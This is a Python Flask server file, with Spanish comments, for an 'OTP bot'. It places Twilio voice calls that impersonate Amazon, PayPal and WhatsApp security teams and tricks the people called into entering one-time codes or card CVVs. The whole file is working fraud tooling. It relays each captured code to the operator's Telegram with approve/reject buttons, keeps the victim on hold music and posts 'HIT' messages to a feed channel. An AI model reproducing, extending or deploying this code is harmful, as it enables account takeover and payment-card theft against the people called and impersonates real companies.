from flask import Flask, request, jsonify, Response
from threading import Thread
from database import get_user_script
from config import bot, LIVE_FEED_CHANNEL_ID, TWILIO_APP_URL
from twilio.twiml.voice_response import VoiceResponse, Gather
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging

# Configuración básica de logs de Flask
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask('')

# ==========================================
# 📜 SCRIPTS & CONFIG
# ==========================================
DEFAULT_SCRIPTS = {
    "amazon": "Hello. This is Amazon Security. We detected a suspicious purchase. Please enter the verification code sent to your mobile device.",
    "paypal": "Hello. This is PayPal Fraud Prevention. A login attempt was made from a new device. Enter your security code to block it.",
    "whatsapp": "Hello. This is WhatsApp Support. We noticed a login request. Please enter the 6-digit code to verify your account.",
    "default": "Hello. This is an automated security call from {service}. We detected unauthorized activity. Please enter the verification code sent to your mobile."
}

@app.route('/')
def home():
    return "OTP Bot Server Running."

# ==========================================
# 1. TWILIO VOICE (INICIO)
# ==========================================
@app.route('/twilio/voice', methods=['POST'])
def twilio_voice():
    service_raw = request.args.get('service', 'Security')
    user_id = request.args.get('user_id')
    mode = request.args.get('mode', 'otp')
    
    resp = VoiceResponse()
    
    # Selección de Script
    digits_needed = 3 if mode == 'cvv' else 8
    
    custom_data = get_user_script(user_id, service_raw.lower())
    if custom_data:
        say_text, lang = custom_data
    else:
        lang = 'en-US'
        key = service_raw.lower()
        if key in DEFAULT_SCRIPTS: say_text = DEFAULT_SCRIPTS[key]
        else: say_text = DEFAULT_SCRIPTS["default"].format(service=service_raw)

    # Gather inicial
    gather = Gather(
        num_digits=digits_needed, 
        action=f'/twilio/gather?user_id={user_id}&service={service_raw}&mode={mode}', 
        method='POST', 
        timeout=10
    )
    gather.say(say_text, voice='alice', language=lang)
    
    resp.append(gather)
    resp.redirect('/twilio/voice') # Loop si no ingresa nada
    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 2. TWILIO GATHER (CAPTURA + HOLD)
# ==========================================
@app.route('/twilio/gather', methods=['POST'])
def twilio_gather():
    digits = request.values.get('Digits')
    call_sid = request.values.get('CallSid')
    user_id = request.args.get('user_id')
    service = request.args.get('service')
    
    resp = VoiceResponse()

    if digits and user_id:
        # A) Enviar Panel a Telegram
        try:
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("✅ APPROVE", callback_data=f"live_approve_{call_sid}"),
                InlineKeyboardButton("❌ REJECT / RETRY", callback_data=f"live_reject_{call_sid}")
            )
            
            bot.send_message(
                user_id, 
                f"🎹 **CODE CAPTURED!**\n\n"
                f"👤 Service: `{service}`\n"
                f"🔢 Input: `{digits}`\n"
                f"📞 Status: 🟡 **ON HOLD** (Waiting for you...)", 
                reply_markup=markup,
                parse_mode="Markdown"
            )
            
            # Log Feed Público
            if LIVE_FEED_CHANNEL_ID:
                masked = f"{digits[:3]}***"
                bot.send_message(LIVE_FEED_CHANNEL_ID, f"🔥 **HIT!** {service} | `{masked}`")
                
        except Exception as e:
            print(f"Error TG: {e}")

        # B) Poner a la víctima en ESPERA (Música)
        resp.say("Please hold while we verify your identity.", voice='alice')
        
        # C) Iniciar Loop de espera (Loop empieza en 1)
        resp.redirect('/twilio/wait_loop?loop=1') 
        
    else:
        resp.say("Invalid input.", voice='alice')
        resp.redirect(f'/twilio/voice?service={service}&user_id={user_id}') # Reintentar

    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 3. RUTAS DE LÓGICA (LIVE PANEL)
# ==========================================

@app.route('/twilio/wait_loop', methods=['POST', 'GET'])
def wait_loop():
    """
    Mantiene la música sonando, PERO con un límite de seguridad.
    Cada loop es ~30 segundos de música.
    """
    # 1. Obtenemos el contador de vueltas (si no existe, es 1)
    loop_count = int(request.args.get('loop', 1))
    
    resp = VoiceResponse()
    
    # 2. Seguridad: Si lleva más de 3 vueltas (aprox 1:30 min), CORTAR.
    if loop_count > 3:
        resp.say("Verification timed out. Goodbye.", voice='alice')
        resp.hangup()
        return Response(str(resp), mimetype='text/xml')

    # 3. Si no ha llegado al límite, reproducir música y sumar 1 vuelta
    resp.play("http://com.twilio.sounds.music/ClockworkWaltz.mp3")
    
    # Redirigimos pasándole el nuevo contador (+1)
    resp.redirect(f'/twilio/wait_loop?loop={loop_count + 1}')
    
    return Response(str(resp), mimetype='text/xml')

@app.route('/twilio/logic/approve', methods=['POST'])
def logic_approve():
    """Lógica cuando das CLICK EN APROBAR."""
    resp = VoiceResponse()
    resp.say("Identity verified successfully. Thank you. Goodbye.", voice='alice')
    resp.hangup()
    return Response(str(resp), mimetype='text/xml')

@app.route('/twilio/logic/reject', methods=['POST'])
def logic_reject():
    """Lógica cuando das CLICK EN RECHAZAR."""
    resp = VoiceResponse()
    resp.say("The verification code is invalid. Please try again.", voice='alice')
    
    # Volvemos a pedir el código (Gather)
    gather = Gather(num_digits=8, action='/twilio/gather_retry', method='POST', timeout=10)
    gather.say("Please enter the verification code again.", voice='alice')
    resp.append(gather)
    
    return Response(str(resp), mimetype='text/xml')

@app.route('/twilio/gather_retry', methods=['POST'])
def gather_retry():
    """Maneja el segundo intento."""
    digits = request.values.get('Digits')
    resp = VoiceResponse()
    if digits:
        resp.say("Thank you. We are verifying.", voice='alice')
        resp.hangup() 
    else:
        resp.say("Goodbye.", voice='alice')
        resp.hangup()
    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 4. STATUS MONITOR
# ==========================================
@app.route('/twilio/status', methods=['POST'])
def twilio_status():
    return Response("OK", mimetype='text/plain')

# ==========================================
# SERVER RUNNER
# ==========================================
def run():
    app.run(host='0.0.0.0', port=8080)

def start_server():
    t = Thread(target=run)
    t.start()